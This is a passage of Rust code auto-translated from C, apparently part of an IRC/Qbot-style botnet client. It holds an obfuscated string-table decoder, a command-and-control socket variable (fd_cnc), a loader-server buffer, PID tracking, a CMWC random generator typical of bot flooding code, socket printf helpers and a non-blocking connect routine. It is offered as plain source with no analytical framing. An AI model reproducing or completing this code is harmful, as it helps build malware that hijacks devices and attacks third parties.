    '1' as i32 as libc::c_char,
    '2' as i32 as libc::c_char,
    '3' as i32 as libc::c_char,
    '4' as i32 as libc::c_char,
    '5' as i32 as libc::c_char,
    '6' as i32 as libc::c_char,
    '7' as i32 as libc::c_char,
    '8' as i32 as libc::c_char,
    '9' as i32 as libc::c_char,
    'a' as i32 as libc::c_char,
    'b' as i32 as libc::c_char,
    'c' as i32 as libc::c_char,
    'd' as i32 as libc::c_char,
    'e' as i32 as libc::c_char,
    'f' as i32 as libc::c_char,
    'g' as i32 as libc::c_char,
    'h' as i32 as libc::c_char,
    'i' as i32 as libc::c_char,
    'j' as i32 as libc::c_char,
    'k' as i32 as libc::c_char,
    'l' as i32 as libc::c_char,
    'm' as i32 as libc::c_char,
    'n' as i32 as libc::c_char,
    'o' as i32 as libc::c_char,
    'p' as i32 as libc::c_char,
    'q' as i32 as libc::c_char,
    'r' as i32 as libc::c_char,
    's' as i32 as libc::c_char,
    't' as i32 as libc::c_char,
    'u' as i32 as libc::c_char,
    'v' as i32 as libc::c_char,
    'w' as i32 as libc::c_char,
    'x' as i32 as libc::c_char,
    'y' as i32 as libc::c_char,
    'z' as i32 as libc::c_char,
    'A' as i32 as libc::c_char,
    'B' as i32 as libc::c_char,
    'C' as i32 as libc::c_char,
    'D' as i32 as libc::c_char,
    'E' as i32 as libc::c_char,
    'F' as i32 as libc::c_char,
    'G' as i32 as libc::c_char,
    'H' as i32 as libc::c_char,
    'I' as i32 as libc::c_char,
    'J' as i32 as libc::c_char,
    'K' as i32 as libc::c_char,
    'L' as i32 as libc::c_char,
    'M' as i32 as libc::c_char,
    'N' as i32 as libc::c_char,
    'O' as i32 as libc::c_char,
    'P' as i32 as libc::c_char,
    'Q' as i32 as libc::c_char,
    'R' as i32 as libc::c_char,
    'S' as i32 as libc::c_char,
    'T' as i32 as libc::c_char,
    'U' as i32 as libc::c_char,
    'V' as i32 as libc::c_char,
    'W' as i32 as libc::c_char,
    'X' as i32 as libc::c_char,
    'Y' as i32 as libc::c_char,
    'Z' as i32 as libc::c_char,
    '.' as i32 as libc::c_char,
    ' ' as i32 as libc::c_char,
];
#[no_mangle]
pub static mut decodedgay: *mut *mut libc::c_char = 0 as *const *mut libc::c_char
    as *mut *mut libc::c_char;
#[no_mangle]
pub unsafe extern "C" fn okic(mut str: *mut libc::c_char) -> *mut libc::c_char {
    let mut decodedshit2: *mut *mut libc::c_char = 0 as *mut *mut libc::c_char;
    let mut x_0: libc::c_int = 0 as libc::c_int;
    let mut i_0: libc::c_int = 0 as libc::c_int;
    let mut c_0: libc::c_int = 0;
    decodedshit2 = malloc(
        ::std::mem::size_of::<*mut *mut libc::c_char>() as libc::c_ulong,
    ) as *mut *mut libc::c_char;
    i_0 = 0 as libc::c_int;
    while i_0 < numdecodes - 1 as libc::c_int {
        let ref mut fresh2 = *decodedshit2.offset(i_0 as isize);
        *fresh2 = *decodedgay.offset(i_0 as isize);
        i_0 += 1;
    }
    memset(
        decoded.as_mut_ptr() as *mut libc::c_void,
        0 as libc::c_int,
        ::std::mem::size_of::<[libc::c_char; 256]>() as libc::c_ulong,
    );
    while (x_0 as libc::c_ulong) < strlen(str) {
        c_0 = 0 as libc::c_int;
        while c_0 as libc::c_ulong
            <= ::std::mem::size_of::<[libc::c_char; 64]>() as libc::c_ulong
        {
            if *str.offset(x_0 as isize) as libc::c_int
                == encodes[c_0 as usize] as libc::c_int
            {
                decoded[i_0 as usize] = decodes[c_0 as usize];
                i_0 += 1;
            }
            c_0 += 1;
        }
        x_0 += 1;
    }
    let ref mut fresh3 = *decodedshit2.offset((numdecodes - 1 as libc::c_int) as isize);
    *fresh3 = decoded.as_mut_ptr();
    free(decodedgay as *mut libc::c_void);
    decodedgay = decodedshit2;
    return *decodedgay.offset((numdecodes - 1 as libc::c_int) as isize);
}
#[no_mangle]
pub static mut fd_cnc: libc::c_int = -(1 as libc::c_int);
#[no_mangle]
pub static mut gotIP: libc::c_int = 0 as libc::c_int;
#[no_mangle]
pub static mut ldserver: [libc::c_uchar; 41] = [0; 41];
#[no_mangle]
pub static mut pids: *mut uint32_t = 0 as *const uint32_t as *mut uint32_t;
#[no_mangle]
pub static mut rangechoice: libc::c_int = 1 as libc::c_int;
#[no_mangle]
pub static mut numpids: uint64_t = 0 as libc::c_int as uint64_t;
#[no_mangle]
pub static mut ourIP: in_addr = in_addr { s_addr: 0 };
#[no_mangle]
pub static mut ourPublicIP: in_addr = in_addr { s_addr: 0 };
#[no_mangle]
pub static mut macAddress: [libc::c_uchar; 6] = [
    0 as libc::c_int as libc::c_uchar,
    0,
    0,
    0,
    0,
    0,
];
#[no_mangle]
pub unsafe extern "C" fn util_strlen(mut str: *mut libc::c_char) -> libc::c_int {
    let mut c_0: libc::c_int = 0 as libc::c_int;
    loop {
        let fresh4 = str;
        str = str.offset(1);
        if !(*fresh4 as libc::c_int != 0 as libc::c_int) {
            break;
        }
        c_0 += 1;
    }
    return c_0;
}
#[no_mangle]
pub unsafe extern "C" fn util_stristr(
    mut haystack: *mut libc::c_char,
    mut haystack_len: libc::c_int,
    mut str: *mut libc::c_char,
) -> libc::c_int {
    let mut ptr: *mut libc::c_char = haystack;
    let mut str_len: libc::c_int = util_strlen(str);
    let mut match_count: libc::c_int = 0 as libc::c_int;
    loop {
        let fresh5 = haystack_len;
        haystack_len = haystack_len - 1;
        if !(fresh5 > 0 as libc::c_int) {
            break;
        }
        let fresh6 = ptr;
        ptr = ptr.offset(1);
        let mut a: libc::c_char = *fresh6;
        let mut b: libc::c_char = *str.offset(match_count as isize);
        a = (if a as libc::c_int >= 'A' as i32 && a as libc::c_int <= 'Z' as i32 {
            a as libc::c_int | 0x60 as libc::c_int
        } else {
            a as libc::c_int
        }) as libc::c_char;
        b = (if b as libc::c_int >= 'A' as i32 && b as libc::c_int <= 'Z' as i32 {
            b as libc::c_int | 0x60 as libc::c_int
        } else {
            b as libc::c_int
        }) as libc::c_char;
        if a as libc::c_int == b as libc::c_int {
            match_count += 1;
            if match_count == str_len {
                return ptr.offset_from(haystack) as libc::c_long as libc::c_int;
            }
        } else {
            match_count = 0 as libc::c_int;
        }
    }
    return -(1 as libc::c_int);
}
#[no_mangle]
pub unsafe extern "C" fn util_memcpy(
    mut dst: *mut libc::c_void,
    mut src: *mut libc::c_void,
    mut len: libc::c_int,
) {
    let mut r_dst: *mut libc::c_char = dst as *mut libc::c_char;
    let mut r_src: *mut libc::c_char = src as *mut libc::c_char;
    loop {
        let fresh7 = len;
        len = len - 1;
        if !(fresh7 != 0) {
            break;
        }
        let fresh8 = r_src;
        r_src = r_src.offset(1);
        let fresh9 = r_dst;
        r_dst = r_dst.offset(1);
        *fresh9 = *fresh8;
    };
}
#[no_mangle]
pub unsafe extern "C" fn util_strcpy(
    mut dst: *mut libc::c_char,
    mut src: *mut libc::c_char,
) -> libc::c_int {
    let mut l: libc::c_int = util_strlen(src);
    util_memcpy(
        dst as *mut libc::c_void,
        src as *mut libc::c_void,
        l + 1 as libc::c_int,
    );
    return l;
}
#[no_mangle]
pub unsafe extern "C" fn util_zero(mut buf: *mut libc::c_void, mut len: libc::c_int) {
    let mut zero: *mut libc::c_char = buf as *mut libc::c_char;
    loop {
        let fresh10 = len;
        len = len - 1;
        if !(fresh10 != 0) {
            break;
        }
        let fresh11 = zero;
        zero = zero.offset(1);
        *fresh11 = 0 as libc::c_int as libc::c_char;
    };
}
#[no_mangle]
pub unsafe extern "C" fn util_fdgets(
    mut buffer: *mut libc::c_char,
    mut buffer_size: libc::c_int,
    mut fd: libc::c_int,
) -> *mut libc::c_char {
    let mut got: libc::c_int = 0 as libc::c_int;
    let mut total: libc::c_int = 0 as libc::c_int;
    loop {
        got = read(
            fd,
            buffer.offset(total as isize) as *mut libc::c_void,
            1 as libc::c_int as size_t,
        ) as libc::c_int;
        total = if got == 1 as libc::c_int { total + 1 as libc::c_int } else { total };
        if !(got == 1 as libc::c_int && total < buffer_size
            && *buffer.offset((total - 1 as libc::c_int) as isize) as libc::c_int
                != '\n' as i32)
        {
            break;
        }
    }
    return if total == 0 as libc::c_int { 0 as *mut libc::c_char } else { buffer };
}
#[no_mangle]
pub unsafe extern "C" fn util_isdigit(mut c_0: libc::c_char) -> libc::c_int {
    return (c_0 as libc::c_int >= '0' as i32 && c_0 as libc::c_int <= '9' as i32)
        as libc::c_int;
}
#[no_mangle]
pub unsafe extern "C" fn util_isalpha(mut c_0: libc::c_char) -> libc::c_int {
    return (c_0 as libc::c_int >= 'A' as i32 && c_0 as libc::c_int <= 'Z' as i32
        || c_0 as libc::c_int >= 'a' as i32 && c_0 as libc::c_int <= 'z' as i32)
        as libc::c_int;
}
#[no_mangle]
pub unsafe extern "C" fn util_isspace(mut c_0: libc::c_char) -> libc::c_int {
    return (c_0 as libc::c_int == ' ' as i32 || c_0 as libc::c_int == '\t' as i32
        || c_0 as libc::c_int == '\n' as i32 || c_0 as libc::c_int == '\n' as i32)
        as libc::c_int;
}
#[no_mangle]
pub unsafe extern "C" fn util_isupper(mut c_0: libc::c_char) -> libc::c_int {
    return (c_0 as libc::c_int >= 'A' as i32 && c_0 as libc::c_int <= 'Z' as i32)
        as libc::c_int;
}
#[no_mangle]
pub unsafe extern "C" fn util_atoi(
    mut str: *mut libc::c_char,
    mut base: libc::c_int,
) -> libc::c_int {
    let mut acc: libc::c_ulong = 0 as libc::c_int as libc::c_ulong;
    let mut c_0: libc::c_int = 0;
    let mut cutoff: libc::c_ulong = 0;
    let mut neg: libc::c_int = 0 as libc::c_int;
    let mut any: libc::c_int = 0;
    let mut cutlim: libc::c_int = 0;
    loop {
        let fresh12 = str;
        str = str.offset(1);
        c_0 = *fresh12 as libc::c_int;
        if !(util_isspace(c_0 as libc::c_char) != 0) {
            break;
        }
    }
    if c_0 == '-' as i32 {
        neg = 1 as libc::c_int;
        let fresh13 = str;
        str = str.offset(1);
        c_0 = *fresh13 as libc::c_int;
    } else if c_0 == '+' as i32 {
        let fresh14 = str;
        str = str.offset(1);
        c_0 = *fresh14 as libc::c_int;
    }
    cutoff = if neg != 0 {
        ((-(9223372036854775807 as libc::c_long) - 1 as libc::c_long) as libc::c_ulong)
            .wrapping_neg()
    } else {
        9223372036854775807 as libc::c_long as libc::c_ulong
    };
    cutlim = cutoff.wrapping_rem(base as libc::c_ulong) as libc::c_int;
    cutoff = cutoff.wrapping_div(base as libc::c_ulong);
    acc = 0 as libc::c_int as libc::c_ulong;
    any = 0 as libc::c_int;
    loop {
        if util_isdigit(c_0 as libc::c_char) != 0 {
            c_0 -= '0' as i32;
        } else {
            if !(util_isalpha(c_0 as libc::c_char) != 0) {
                break;
            }
            c_0
                -= if util_isupper(c_0 as libc::c_char) != 0 {
                    'A' as i32 - 10 as libc::c_int
                } else {
                    'a' as i32 - 10 as libc::c_int
                };
        }
        if c_0 >= base {
            break;
        }
        if any < 0 as libc::c_int || acc > cutoff || acc == cutoff && c_0 > cutlim {
            any = -(1 as libc::c_int);
        } else {
            any = 1 as libc::c_int;
            acc = acc.wrapping_mul(base as libc::c_ulong);
            acc = acc.wrapping_add(c_0 as libc::c_ulong);
        }
        let fresh15 = str;
        str = str.offset(1);
        c_0 = *fresh15 as libc::c_int;
    }
    if any < 0 as libc::c_int {
        acc = (if neg != 0 {
            -(9223372036854775807 as libc::c_long) - 1 as libc::c_long
        } else {
            9223372036854775807 as libc::c_long
        }) as libc::c_ulong;
    } else if neg != 0 {
        acc = acc.wrapping_neg();
    }
    return acc as libc::c_int;
}
#[no_mangle]
pub unsafe extern "C" fn util_itoa(
    mut value: libc::c_int,
    mut radix: libc::c_int,
    mut string: *mut libc::c_char,
) -> *mut libc::c_char {
    if string.is_null() {
        return 0 as *mut libc::c_char;
    }
    if value != 0 as libc::c_int {
        let mut scratch: [libc::c_char; 34] = [0; 34];
        let mut neg: libc::c_int = 0;
        let mut offset: libc::c_int = 0;
        let mut c_0: libc::c_int = 0;
        let mut accum: libc::c_uint = 0;
        offset = 32 as libc::c_int;
        scratch[33 as libc::c_int as usize] = 0 as libc::c_int as libc::c_char;
        if radix == 10 as libc::c_int && value < 0 as libc::c_int {
            neg = 1 as libc::c_int;
            accum = -value as libc::c_uint;
        } else {
            neg = 0 as libc::c_int;
            accum = value as libc::c_uint;
        }
        while accum != 0 {
            c_0 = accum.wrapping_rem(radix as libc::c_uint) as libc::c_int;
            if c_0 < 10 as libc::c_int {
                c_0 += '0' as i32;
            } else {
                c_0 += 'A' as i32 - 10 as libc::c_int;
            }
            scratch[offset as usize] = c_0 as libc::c_char;
            accum = accum.wrapping_div(radix as libc::c_uint);
            offset -= 1;
        }
        if neg != 0 {
            scratch[offset as usize] = '-' as i32 as libc::c_char;
        } else {
            offset += 1;
        }
        util_strcpy(string, &mut *scratch.as_mut_ptr().offset(offset as isize));
    } else {
        *string.offset(0 as libc::c_int as isize) = '0' as i32 as libc::c_char;
        *string.offset(1 as libc::c_int as isize) = 0 as libc::c_int as libc::c_char;
    }
    return string;
}
#[no_mangle]
pub unsafe extern "C" fn util_strcmp(
    mut str1: *mut libc::c_char,
    mut str2: *mut libc::c_char,
) -> libc::c_int {
    let mut l1: libc::c_int = util_strlen(str1);
    let mut l2: libc::c_int = util_strlen(str2);
    if l1 != l2 {
        return 0 as libc::c_int;
    }
    loop {
        let fresh16 = l1;
        l1 = l1 - 1;
        if !(fresh16 != 0) {
            break;
        }
        let fresh17 = str1;
        str1 = str1.offset(1);
        let fresh18 = str2;
        str2 = str2.offset(1);
        if *fresh17 as libc::c_int != *fresh18 as libc::c_int {
            return 0 as libc::c_int;
        }
    }
    return 1 as libc::c_int;
}
#[no_mangle]
pub unsafe extern "C" fn util_memsearch(
    mut buf: *mut libc::c_char,
    mut buf_len: libc::c_int,
    mut mem: *mut libc::c_char,
    mut mem_len: libc::c_int,
) -> libc::c_int {
    let mut i_0: libc::c_int = 0;
    let mut matched: libc::c_int = 0 as libc::c_int;
    if mem_len > buf_len {
        return -(1 as libc::c_int);
    }
    i_0 = 0 as libc::c_int;
    while i_0 < buf_len {
        if *buf.offset(i_0 as isize) as libc::c_int
            == *mem.offset(matched as isize) as libc::c_int
        {
            matched += 1;
            if matched == mem_len {
                return i_0 + 1 as libc::c_int;
            }
        } else {
            matched = 0 as libc::c_int;
        }
        i_0 += 1;
    }
    return -(1 as libc::c_int);
}
static mut Q: [uint32_t; 4096] = [0; 4096];
static mut c: uint32_t = 362436 as libc::c_int as uint32_t;
#[no_mangle]
pub unsafe extern "C" fn init_rand(mut x_0: uint32_t) {
    let mut i_0: libc::c_int = 0;
    Q[0 as libc::c_int as usize] = x_0;
    Q[1 as libc::c_int as usize] = x_0.wrapping_add(0x9e3779b9 as libc::c_uint);
    Q[2 as libc::c_int
        as usize] = x_0
        .wrapping_add(0x9e3779b9 as libc::c_uint)
        .wrapping_add(0x9e3779b9 as libc::c_uint);
    i_0 = 3 as libc::c_int;
    while i_0 < 4096 as libc::c_int {
        Q[i_0
            as usize] = Q[(i_0 - 3 as libc::c_int) as usize]
            ^ Q[(i_0 - 2 as libc::c_int) as usize] ^ 0x9e3779b9 as libc::c_uint
            ^ i_0 as libc::c_uint;
        i_0 += 1;
    }
}
#[no_mangle]
pub unsafe extern "C" fn rand_cmwc() -> uint32_t {
    let mut t: uint64_t = 0;
    let mut a: uint64_t = 18782 as libc::c_int as uint64_t;
    static mut i_0: uint32_t = 4095 as libc::c_int as uint32_t;
    let mut x_0: uint32_t = 0;
    let mut r: uint32_t = 0xfffffffe as libc::c_uint;
    i_0 = i_0.wrapping_add(1 as libc::c_int as libc::c_uint)
        & 4095 as libc::c_int as libc::c_uint;
    t = a
        .wrapping_mul(Q[i_0 as usize] as libc::c_ulong)
        .wrapping_add(c as libc::c_ulong);
    c = (t >> 32 as libc::c_int) as uint32_t;
    x_0 = t.wrapping_add(c as libc::c_ulong) as uint32_t;
    if x_0 < c {
        x_0 = x_0.wrapping_add(1);
        c = c.wrapping_add(1);
    }
    Q[i_0 as usize] = r.wrapping_sub(x_0);
    return Q[i_0 as usize];
}
#[no_mangle]
pub unsafe extern "C" fn trim(mut str: *mut libc::c_char) {
    let mut i_0: libc::c_int = 0;
    let mut begin: libc::c_int = 0 as libc::c_int;
    let mut end: libc::c_int = (strlen(str))
        .wrapping_sub(1 as libc::c_int as libc::c_ulong) as libc::c_int;
    while util_isspace(*str.offset(begin as isize)) != 0 {
        begin += 1;
    }
    while end >= begin && util_isspace(*str.offset(end as isize)) != 0 {
        end -= 1;
    }
    i_0 = begin;
    while i_0 <= end {
        *str.offset((i_0 - begin) as isize) = *str.offset(i_0 as isize);
        i_0 += 1;
    }
    *str.offset((i_0 - begin) as isize) = '\0' as i32 as libc::c_char;
}
unsafe extern "C" fn printchar(mut str: *mut *mut libc::c_uchar, mut c_0: libc::c_int) {
    if !str.is_null() {
        **str = c_0 as libc::c_uchar;
        *str = (*str).offset(1);
    } else {
        write(
            1 as libc::c_int,
            &mut c_0 as *mut libc::c_int as *const libc::c_void,
            1 as libc::c_int as size_t,
        );
    };
}
unsafe extern "C" fn prints(
    mut out: *mut *mut libc::c_uchar,
    mut string: *const libc::c_uchar,
    mut width: libc::c_int,
    mut pad: libc::c_int,
) -> libc::c_int {
    let mut pc: libc::c_int = 0 as libc::c_int;
    let mut padchar: libc::c_int = ' ' as i32;
    if width > 0 as libc::c_int {
        let mut len: libc::c_int = 0 as libc::c_int;
        let mut ptr: *const libc::c_uchar = 0 as *const libc::c_uchar;
        ptr = string;
        while *ptr != 0 {
            len += 1;
            ptr = ptr.offset(1);
        }
        if len >= width {
            width = 0 as libc::c_int;
        } else {
            width -= len;
        }
        if pad & 2 as libc::c_int != 0 {
            padchar = '0' as i32;
        }
    }
    if pad & 1 as libc::c_int == 0 {
        while width > 0 as libc::c_int {
            printchar(out, padchar);
            pc += 1;
            width -= 1;
        }
    }
    while *string != 0 {
        printchar(out, *string as libc::c_int);
        pc += 1;
        string = string.offset(1);
    }
    while width > 0 as libc::c_int {
        printchar(out, padchar);
        pc += 1;
        width -= 1;
    }
    return pc;
}
unsafe extern "C" fn printi(
    mut out: *mut *mut libc::c_uchar,
    mut i_0: libc::c_int,
    mut b: libc::c_int,
    mut sg: libc::c_int,
    mut width: libc::c_int,
    mut pad: libc::c_int,
    mut letbase: libc::c_int,
) -> libc::c_int {
    let mut print_buf: [libc::c_uchar; 12] = [0; 12];
    let mut s: *mut libc::c_uchar = 0 as *mut libc::c_uchar;
    let mut t: libc::c_int = 0;
    let mut neg: libc::c_int = 0 as libc::c_int;
    let mut pc: libc::c_int = 0 as libc::c_int;
    let mut u: libc::c_uint = i_0 as libc::c_uint;
    if i_0 == 0 as libc::c_int {
        print_buf[0 as libc::c_int as usize] = '0' as i32 as libc::c_uchar;
        print_buf[1 as libc::c_int as usize] = '\0' as i32 as libc::c_uchar;
        return prints(out, print_buf.as_mut_ptr(), width, pad);
    }
    if sg != 0 && b == 10 as libc::c_int && i_0 < 0 as libc::c_int {
        neg = 1 as libc::c_int;
        u = -i_0 as libc::c_uint;
    }
    s = print_buf
        .as_mut_ptr()
        .offset(12 as libc::c_int as isize)
        .offset(-(1 as libc::c_int as isize));
    *s = '\0' as i32 as libc::c_uchar;
    while u != 0 {
        t = u.wrapping_rem(b as libc::c_uint) as libc::c_int;
        if t >= 10 as libc::c_int {
            t += letbase - '0' as i32 - 10 as libc::c_int;
        }
        s = s.offset(-1);
        *s = (t + '0' as i32) as libc::c_uchar;
        u = u.wrapping_div(b as libc::c_uint);
    }
    if neg != 0 {
        if width != 0 && pad & 2 as libc::c_int != 0 {
            printchar(out, '-' as i32);
            pc += 1;
            width -= 1;
        } else {
            s = s.offset(-1);
            *s = '-' as i32 as libc::c_uchar;
        }
    }
    return pc + prints(out, s, width, pad);
}
unsafe extern "C" fn print(
    mut out: *mut *mut libc::c_uchar,
    mut format: *const libc::c_uchar,
    mut args: ::std::ffi::VaList,
) -> libc::c_int {
    let mut width: libc::c_int = 0;
    let mut pad: libc::c_int = 0;
    let mut pc: libc::c_int = 0 as libc::c_int;
    let mut scr: [libc::c_uchar; 2] = [0; 2];
    let mut current_block_23: u64;
    while *format as libc::c_int != 0 as libc::c_int {
        if *format as libc::c_int == '%' as i32 {
            format = format.offset(1);
            pad = 0 as libc::c_int;
            width = pad;
            if *format as libc::c_int == '\0' as i32 {
                break;
            }
            if *format as libc::c_int == '%' as i32 {
                current_block_23 = 2663130801967040668;
            } else {
                if *format as libc::c_int == '-' as i32 {
                    format = format.offset(1);
                    pad = 1 as libc::c_int;
                }
                while *format as libc::c_int == '0' as i32 {
                    format = format.offset(1);
                    pad |= 2 as libc::c_int;
                }
                while *format as libc::c_int >= '0' as i32
                    && *format as libc::c_int <= '9' as i32
                {
                    width *= 10 as libc::c_int;
                    width += *format as libc::c_int - '0' as i32;
                    format = format.offset(1);
                }
                if *format as libc::c_int == 's' as i32 {
                    let mut s: *mut libc::c_char = args.arg::<intptr_t>()
                        as *mut libc::c_char;
                    pc
                        += prints(
                            out,
                            (if !s.is_null() {
                                s
                            } else {
                                b"(null)\0" as *const u8 as *const libc::c_char
                            }) as *const libc::c_uchar,
                            width,
                            pad,
                        );
                } else if *format as libc::c_int == 'd' as i32 {
                    pc
                        += printi(
                            out,
                            args.arg::<libc::c_int>(),
                            10 as libc::c_int,
                            1 as libc::c_int,
                            width,
                            pad,
                            'a' as i32,
                        );
                } else if *format as libc::c_int == 'x' as i32 {
                    pc
                        += printi(
                            out,
                            args.arg::<libc::c_int>(),
                            16 as libc::c_int,
                            0 as libc::c_int,
                            width,
                            pad,
                            'a' as i32,
                        );
                } else if *format as libc::c_int == 'X' as i32 {
                    pc
                        += printi(
                            out,
                            args.arg::<libc::c_int>(),
                            16 as libc::c_int,
                            0 as libc::c_int,
                            width,
                            pad,
                            'A' as i32,
                        );
                } else if *format as libc::c_int == 'u' as i32 {
                    pc
                        += printi(
                            out,
                            args.arg::<libc::c_int>(),
                            10 as libc::c_int,
                            0 as libc::c_int,
                            width,
                            pad,
                            'a' as i32,
                        );
                } else if *format as libc::c_int == 'c' as i32 {
                    scr[0 as libc::c_int
                        as usize] = args.arg::<libc::c_int>() as libc::c_uchar;
                    scr[1 as libc::c_int as usize] = '\0' as i32 as libc::c_uchar;
                    pc += prints(out, scr.as_mut_ptr(), width, pad);
                }
                current_block_23 = 14916268686031723178;
            }
        } else {
            current_block_23 = 2663130801967040668;
        }
        match current_block_23 {
            2663130801967040668 => {
                printchar(out, *format as libc::c_int);
                pc += 1;
            }
            _ => {}
        }
        format = format.offset(1);
    }
    if !out.is_null() {
        **out = '\0' as i32 as libc::c_uchar;
    }
    return pc;
}
#[no_mangle]
pub unsafe extern "C" fn zprintf(
    mut format: *const libc::c_uchar,
    mut args: ...
) -> libc::c_int {
    let mut args_0: ::std::ffi::VaListImpl;
    args_0 = args.clone();
    return print(0 as *mut *mut libc::c_uchar, format, args_0.as_va_list());
}
#[no_mangle]
pub unsafe extern "C" fn szprintf(
    mut out: *mut libc::c_uchar,
    mut format: *const libc::c_uchar,
    mut args: ...
) -> libc::c_int {
    let mut args_0: ::std::ffi::VaListImpl;
    args_0 = args.clone();
    return print(&mut out, format, args_0.as_va_list());
}
#[no_mangle]
pub unsafe extern "C" fn sockprintf(
    mut sock: libc::c_int,
    mut formatStr: *mut libc::c_char,
    mut args: ...
) -> libc::c_int {
    let mut textBuffer: *mut libc::c_uchar = malloc(2048 as libc::c_int as libc::c_ulong)
        as *mut libc::c_uchar;
    memset(
        textBuffer as *mut libc::c_void,
        0 as libc::c_int,
        2048 as libc::c_int as libc::c_ulong,
    );
    let mut orig: *mut libc::c_char = textBuffer as *mut libc::c_char;
    let mut args_0: ::std::ffi::VaListImpl;
    args_0 = args.clone();
    print(&mut textBuffer, formatStr as *const libc::c_uchar, args_0.as_va_list());
    *orig.offset(strlen(orig) as isize) = '\n' as i32 as libc::c_char;
    let mut q: libc::c_int = send(
        sock,
        orig as *const libc::c_void,
        strlen(orig),
        MSG_NOSIGNAL as libc::c_int,
    ) as libc::c_int;
    free(orig as *mut libc::c_void);
    return q;
}
#[no_mangle]
pub unsafe extern "C" fn getHost(
    mut hostname: *mut libc::c_uchar,
    mut in_0: *mut in_addr,
) -> libc::c_int {
    let mut result: libc::c_int = inet_pton(
        2 as libc::c_int,
        hostname as *const libc::c_char,
        in_0 as *mut libc::c_void,
    );
    if result != 0 as libc::c_int {
        return 0 as libc::c_int;
    }
    let mut hints: addrinfo = addrinfo {
        ai_flags: 0,
        ai_family: 0,
        ai_socktype: 0,
        ai_protocol: 0,
        ai_addrlen: 0,
        ai_addr: 0 as *mut sockaddr,
        ai_canonname: 0 as *mut libc::c_char,
        ai_next: 0 as *mut addrinfo,
    };
    let mut servinfo: *mut addrinfo = 0 as *mut addrinfo;
    let mut p: *mut addrinfo = 0 as *mut addrinfo;
    let mut h: *mut sockaddr_in = 0 as *mut sockaddr_in;
    let mut rv: libc::c_int = 0;
    memset(
        &mut hints as *mut addrinfo as *mut libc::c_void,
        0 as libc::c_int,
        ::std::mem::size_of::<addrinfo>() as libc::c_ulong,
    );
    hints.ai_family = 2 as libc::c_int;
    hints.ai_socktype = SOCK_STREAM as libc::c_int;
    rv = getaddrinfo(
        hostname as *const libc::c_char,
        0 as *const libc::c_char,
        &mut hints,
        &mut servinfo,
    );
    if rv != 0 as libc::c_int {
        return 1 as libc::c_int;
    }
    p = servinfo;
    while !p.is_null() {
        h = (*p).ai_addr as *mut sockaddr_in;
        bcopy(
            in_0 as *const libc::c_void,
            &mut (*h).sin_addr as *mut in_addr as *mut libc::c_void,
            (*p).ai_addrlen as size_t,
        );
        p = (*p).ai_next;
    }
    return 0 as libc::c_int;
}
#[no_mangle]
pub unsafe extern "C" fn connectTimeout(
    mut fd: libc::c_int,
    mut host: *mut libc::c_char,
    mut port: libc::c_int,
    mut timeout: libc::c_int,
) -> libc::c_int {
    let mut dest_addr: sockaddr_in = sockaddr_in {
        sin_family: 0,
        sin_port: 0,
        sin_addr: in_addr { s_addr: 0 },
        sin_zero: [0; 8],
    };
    let mut myset: fd_set = fd_set { __fds_bits: [0; 16] };
    let mut tv: timeval = timeval { tv_sec: 0, tv_usec: 0 };
    let mut lon: socklen_t = 0;
    let mut valopt: libc::c_int = 0;
    let mut arg: libc::c_long = fcntl(fd, 3 as libc::c_int, 0 as *mut libc::c_void)
        as libc::c_long;
    arg |= 0o4000 as libc::c_int as libc::c_long;
    fcntl(fd, 4 as libc::c_int, arg);
    dest_addr.sin_family = 2 as libc::c_int as sa_family_t;
    dest_addr
        .sin_port = ((port as libc::c_ushort as libc::c_int & 0xff as libc::c_int)
        << 8 as libc::c_int
        | (port as libc::c_ushort as libc::c_int & 0xff00 as libc::c_int)
            >> 8 as libc::c_int) as in_port_t;
    if getHost(host as *mut libc::c_uchar, &mut dest_addr.sin_addr) != 0 {
        return 0 as libc::c_int;
    }
    memset(
        (dest_addr.sin_zero).as_mut_ptr() as *mut libc::c_void,
        '\0' as i32,
        ::std::mem::size_of::<[libc::c_uchar; 8]>() as libc::c_ulong,
    );
    let mut res: libc::c_int = connect(
        fd,
        &mut dest_addr as *mut sockaddr_in as *mut sockaddr,
        ::std::mem::size_of::<sockaddr_in>() as libc::c_ulong as socklen_t,
    );
    if res < 0 as libc::c_int {
        if *__errno_location() == 115 as libc::c_int {
            tv.tv_sec = timeout as __time_t;
            tv.tv_usec = 0 as libc::c_int as __suseconds_t;
            let mut __d0: libc::c_int = 0;
            let mut __d1: libc::c_int = 0;
            let fresh19 = &mut __d0;
            let fresh20;
            let fresh21 = (::std::mem::size_of::<fd_set>() as libc::c_ulong)
                .wrapping_div(::std::mem::size_of::<__fd_mask>() as libc::c_ulong);
            let fresh22 = &mut __d1;
            let fresh23;
            let fresh24 = &mut *(myset.__fds_bits)
                .as_mut_ptr()
                .offset(0 as libc::c_int as isize) as *mut __fd_mask;
            asm!(
                "cld; rep; stosq", inlateout("cx")
                c2rust_asm_casts::AsmCast::cast_in(fresh19, fresh21) => fresh20,
                inlateout("di") c2rust_asm_casts::AsmCast::cast_in(fresh22, fresh24) =>
                fresh23, inlateout("ax") 0 as libc::c_int => _, options(preserves_flags)
            );
            c2rust_asm_casts::AsmCast::cast_out(fresh19, fresh21, fresh20);
            c2rust_asm_casts::AsmCast::cast_out(fresh22, fresh24, fresh23);
            myset
                .__fds_bits[(fd
                / (8 as libc::c_int
                    * ::std::mem::size_of::<__fd_mask>() as libc::c_ulong
                        as libc::c_int)) as usize]
                |= ((1 as libc::c_ulong)
                    << fd
                        % (8 as libc::c_int
                            * ::std::mem::size_of::<__fd_mask>() as libc::c_ulong
                                as libc::c_int)) as __fd_mask;
            if select(
                fd + 1 as libc::c_int,
                0 as *mut fd_set,
                &mut myset,
                0 as *mut fd_set,
                &mut tv,
            ) > 0 as libc::c_int
            {
                lon = ::std::mem::size_of::<libc::c_int>() as libc::c_ulong as socklen_t;
                getsockopt(
                    fd,
                    1 as libc::c_int,
                    4 as libc::c_int,
                    &mut valopt as *mut libc::c_int as *mut libc::c_void,
                    &mut lon,
                );
                if valopt != 0 {
                    return 0 as libc::c_int;
                }
            } else {
                return 0 as libc::c_int
            }
        } else {
            return 0 as libc::c_int
        }
    }
    arg = fcntl(fd, 3 as libc::c_int, 0 as *mut libc::c_void) as libc::c_long;
    arg &= !(0o4000 as libc::c_int) as libc::c_long;
    fcntl(fd, 4 as libc::c_int, arg);
    return 1 as libc::c_int;
}
#[no_mangle]
pub unsafe extern "C" fn mytoupper(mut ch: libc::c_int) -> libc::c_int {
    if ch >= 'a' as i32 && ch <= 'z' as i32 {
        return 'A' as i32 + ch - 'a' as i32
    } else {
        return ch
    };
}
#[no_mangle]
